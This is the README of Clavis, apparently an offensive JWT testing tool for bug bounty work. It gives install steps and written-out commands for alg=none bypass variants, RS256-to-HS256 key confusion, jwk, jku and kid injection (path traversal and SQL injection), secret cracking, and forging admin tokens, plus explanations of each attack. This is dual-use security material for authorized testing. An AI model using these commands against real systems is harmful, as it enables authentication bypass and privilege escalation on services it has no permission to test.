<div align="center">

<img src="assets/hero.png" alt="Clavis — the JWT multitool for bug bounty" width="100%">

# 🗝️ Clavis

**The JWT multitool for bug bounty — decode, audit, crack, forge and break JSON Web Tokens from one static binary.**

[![Release](https://img.shields.io/github/v/release/MRvirusIR/clavis?style=for-the-badge&labelColor=05080b&color=19E6E6)](https://github.com/MRvirusIR/clavis/releases/latest)
[![Go](https://img.shields.io/badge/Go-1.21%2B-19E6E6?style=for-the-badge&logo=go&logoColor=white&labelColor=05080b)](https://golang.org/)
[![Platforms](https://img.shields.io/badge/linux%20·%20macos%20·%20windows-5%20builds-4DFF9E?style=for-the-badge&labelColor=05080b)](https://github.com/MRvirusIR/clavis/releases/latest)
[![License](https://img.shields.io/badge/license-MIT-22c55e?style=for-the-badge&labelColor=05080b)](LICENSE)

<sub>From Shadows To Shells · ⚡️ [@BugCod3](https://t.me/BugCod3)</sub>

</div>

---

> **Clavis** (Latin for *key*) turns the slow, manual parts of JWT testing into one command.
> No dependencies, no Python environment, no online token pasters that leak your tokens — just a
> single ~3 MB binary you can drop on any box.

<table>
<td width="25%" align="center"><b>🔍 Decode & audit</b><br><sub>Header, claims, timestamps<br>+ ranked security findings.</sub></td>
<td width="25%" align="center"><b>🔓 Crack secrets</b><br><sub>Built-in list, wordlists<br>& brute force, multi-core.</sub></td>
<td width="25%" align="center"><b>🪄 Forge tokens</b><br><sub>HS*, RS*, PS* or none,<br>edit any claim in place.</sub></td>
<td width="25%" align="center"><b>💥 Classic attacks</b><br><sub>alg=none, RS→HS, jwk,<br>jku & kid injection.</sub></td>
</table>

> ⚠️ **Authorized security testing only.** Use Clavis on targets you own or are explicitly allowed
> to test. You are responsible for how you use it.

---

## 📥 Install

**Download a prebuilt binary** from the [releases page](https://github.com/MRvirusIR/clavis/releases/latest), unpack and run:

```bash
# Linux x86-64 example
curl -L -o clavis https://github.com/MRvirusIR/clavis/releases/latest/download/clavis_linux_amd64
chmod +x clavis
./clavis version
```

**Or build from source** (Go 1.21+):

```bash
git clone https://github.com/MRvirusIR/clavis
cd clavis
go build -o clavis ./cmd/clavis
```

**Or install with Go:**

```bash
go install github.com/MRvirusIR/clavis/cmd/clavis@latest
```

---

## 💻 Usage

Every command accepts the token via `-t <jwt>`, a positional argument, `@file`, or piped stdin:

```bash
clavis decode -t eyJhbGci...
clavis decode @token.txt
echo "$JWT" | clavis audit
```

### 🔍 Decode & audit

```bash
# Pretty-print header, payload and human-readable timestamps
clavis decode -t eyJhbGci...

# Flag weak algs, alg=none, jwk/jku/kid injection, missing exp, privilege claims…
clavis audit -t eyJhbGci...
```

```
── findings (3) ────────────────────────────────────
  ● CRITICAL  Embedded jwk in header
      The token embeds its own public key. Vulnerable verifiers trust this key directly.
      ↳ Use: clavis jwk-inject -t <token> -set role=admin
  ● MEDIUM  HMAC algorithm (HS256)
      HS* tokens are signed with a shared secret. If weak it can be brute-forced offline.
      ↳ Run: clavis crack -t <token> -w rockyou.txt
```

### 🔓 Crack the HMAC secret

```bash
# Instant pass over ~90 built-in common secrets
clavis crack -t eyJhbGci...

# Full wordlist (multi-core, stops on first hit)
clavis crack -t eyJhbGci... -w /usr/share/wordlists/rockyou.txt

# Incremental brute force
clavis crack -t eyJhbGci... -brute abcdefghijklmnopqrstuvwxyz0123456789 -max 6
```

### 🪄 Forge / edit a token

```bash
# Re-sign with a known secret and escalate privileges
clavis forge -t eyJhbGci... -secret s3cr3t -set role=admin -set sub=1

# Relative expiry: push exp 24h into the future
clavis forge -t eyJhbGci... -secret s3cr3t -set exp=+24h

# Sign a fresh RS256 token with your private key
clavis forge -alg RS256 -key private.pem -set sub=1 -set role=admin

# Remove a claim with k=DELETE
clavis forge -t eyJhbGci... -secret s3cr3t -set exp=DELETE
```

### 💥 Attacks

```bash
# alg=none bypass — print every casing variant to spray at the target
clavis alg-none -t eyJhbGci... -set role=admin -all

# RS256 → HS256 key confusion using the server's PUBLIC key
clavis confuse -t eyJhbGci... -pub public.pem -set role=admin -all

# Embed a self-signed public key in the header (jwk injection)
clavis jwk-inject -t eyJhbGci... -set role=admin

# jku injection: forge a token AND get the JWKS to host at your URL
clavis jku-inject -t eyJhbGci... -jku https://you/.well-known/jwks.json -set role=admin -jwks-out jwks.json

# kid injection: path-traversal presets (e.g. ../../dev/null → empty key)
clavis kid-inject -t eyJhbGci... -presets -set role=admin
# or a SQL-injection kid that returns a key you choose
clavis kid-inject -t eyJhbGci... -kid x -key mykey -sqli -set role=admin
```

### 🕵️ Hunt tokens in traffic

```bash
# Pull every JWT out of a HAR / proxy log / JS bundle and audit each one
clavis scan -f traffic.har -audit
cat app.js | clavis scan
```

### Commands

| Command | Alias | What it does |
|---|---|---|
| `decode` | `d` | Pretty-print header, payload & timestamps |
| `audit` | `a` | Ranked findings: weak alg, `none`, `jwk`/`jku`/`kid`/`x5c`, missing `exp`, privilege claims |
| `verify` | `v` | Check a signature against a secret or public key |
| `crack` | `c` | Brute-force the HS\* secret (built-in list / wordlist / charset) |
| `forge` | `f`, `sign` | Sign a new token with your own claims (HS\*/RS\*/PS\*/none), relative times |
| `alg-none` | `none` | Forge an unsigned token, with casing bypass variants |
| `confuse` | `rs2hs` | RS256→HS256 key-confusion using the public key as the HMAC secret |
| `jwk-inject` | `jwk` | Embed a self-signed key in the header and sign with it |
| `jku-inject` | `jku` | Point `jku` at your JWKS and emit the JWKS document to host |
| `kid-inject` | `kid` | Inject a `kid` (path traversal / SQLi) and sign with the implied key |
| `scan` | `grep` | Extract JWTs from logs/HAR/JS, optionally audit each |

---

## 🧠 The attacks, explained

**`alg=none`** — The JWT spec allows an unsigned token (`"alg":"none"`). If the verifier doesn't
explicitly reject it, you can strip the signature and rewrite any claim. Clavis also sprays casing
variants (`None`, `NONE`, `nOnE`) that defeat naive string blocklists.

**RS256 → HS256 confusion** — An RS256 token is verified with a *public* key. If the server lets the
attacker pick the algorithm, switch it to HS256 and sign with that same public key **as the HMAC
secret**. The server HMAC-verifies with the public key it already trusts — and your forged token
passes. Clavis emits several byte-exact key forms (`-all`) because servers differ on trailing
newlines.

**Embedded `jwk`** — Some libraries trust a public key embedded in the token header. Clavis generates
a fresh keypair, embeds the public half as a `jwk`, and signs with the private half, so the token
self-validates.

**`jku` injection** — If the verifier fetches its keys from the URL in the `jku` header without an
allow-list, point it at a JWKS you host. Clavis forges the token and hands you the exact JWKS JSON to
serve.

**`kid` injection** — The `kid` header often gets concatenated into a file path or SQL query. Point it
at a file with known contents (`../../dev/null` → empty key) or inject SQL that returns a key you
choose — then Clavis signs the token with that key.

**Weak HMAC secret** — HS\* tokens are only as strong as their secret. Boilerplates and tutorials ship
with `secret`, `your-256-bit-secret`, etc. Clavis cracks these offline at millions of guesses/second.

---

## 🧱 Architecture

```
cmd/clavis         CLI: one file per command, friendly help & aliases
internal/jwt       JOSE primitives: parse, base64url, HMAC/RSA/ECDSA, PEM/JWK, build, relative time
internal/audit     static security checks → ranked findings
internal/crack     concurrent wordlist + brute-force engine
internal/attack    alg=none, RS→HS confusion, jwk / jku / kid injection
internal/scan      regex JWT extraction from arbitrary text
internal/words     built-in common-secret list
internal/ui        colors (NO_COLOR aware), banner, section helpers
```

Zero third-party dependencies — everything is Go's standard `crypto`. Small, tested packages, one
static binary.

```bash
go test ./...   # unit tests for jwt, audit, crack, attack, scan
```

---

## 📡 Community

<div align="center">

**Built by [@BugCod3](https://t.me/BugCod3)** · bug bounty write-ups, tools & a daily hacker quiz at [bugcod3.com](https://bugcod3.com)

[![Telegram](https://img.shields.io/badge/Telegram-@BugCod3-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white&labelColor=05080b)](https://t.me/BugCod3)
[![Site](https://img.shields.io/badge/bugcod3.com-19E6E6?style=for-the-badge&logo=firefox&logoColor=white&labelColor=05080b)](https://bugcod3.com)

</div>

---

## ⚖️ Legal

Clavis is a tool for **authorized** security testing and education. Testing systems without explicit
permission is illegal. The author takes no responsibility for misuse.

<div align="center"><sub>MIT · made for hunters, by hunters · ⚡️ @BugCod3</sub></div>
